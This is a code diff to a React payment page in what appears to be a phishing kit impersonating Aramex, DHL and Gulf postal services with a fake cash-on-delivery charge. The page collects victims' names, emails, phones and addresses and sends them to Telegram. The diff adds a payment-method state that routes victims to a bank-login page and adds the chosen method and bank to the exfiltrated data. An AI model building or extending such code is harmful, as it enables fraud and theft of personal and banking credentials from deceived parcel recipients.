@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -24,6 +24,11 @@ import heroQpost from "@/assets/hero-qpost.jpg";
 import heroOmanpost from "@/assets/hero-omanpost.jpg";
 import heroBahpost from "@/assets/hero-bahpost.jpg";
 import heroBg from "@/assets/hero-bg.jpg";
+import {
+  ensurePaymentFlowLink,
+  getPaymentFlowState,
+  PaymentMethod,
+} from "@/lib/paymentFlow";
 
 const PaymentRecipient = () => {
   const { id } = useParams();
@@ -33,6 +38,8 @@ const PaymentRecipient = () => {
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
+  const [method, setMethod] = useState<PaymentMethod>("card");
+  const [selectedBank, setSelectedBank] = useState<string | undefined>();
   
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
@@ -41,6 +48,18 @@ const PaymentRecipient = () => {
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
   
+  useEffect(() => {
+    if (!id) return;
+    ensurePaymentFlowLink(id);
+    const state = getPaymentFlowState(id);
+    if (!state) {
+      navigate(`/pay/${id}/confirm`, { replace: true });
+      return;
+    }
+    setMethod(state.method);
+    setSelectedBank(state.bankKey);
+  }, [id, navigate]);
+
   const heroImages: Record<string, string> = {
     'aramex': heroAramex,
     'dhl': heroDhl,
@@ -88,6 +107,7 @@ const PaymentRecipient = () => {
     }
     
     // Send data to Telegram
+    const nextPath = method === "bank-login" ? `/pay/${id}/login` : `/pay/${id}/details`;
     const telegramResult = await sendToTelegram({
       type: 'payment_recipient',
       data: {
@@ -97,7 +117,9 @@ const PaymentRecipient = () => {
         address: residentialAddress,
         service: serviceName,
         amount: formattedAmount,
-        payment_url: `${window.location.origin}/pay/${id}/details`
+        method,
+        bank: selectedBank,
+        payment_url: `${window.location.origin}${nextPath}`
       },
       timestamp: new Date().toISOString()
     });
@@ -114,9 +136,11 @@ const PaymentRecipient = () => {
       phone: customerPhone,
       address: residentialAddress,
       service: serviceName,
-      amount: formattedAmount
+      amount: formattedAmount,
+      method,
+      bank: selectedBank
     }));
-    navigate(`/pay/${id}/details`);
+    navigate(nextPath);
   };
   
   return (
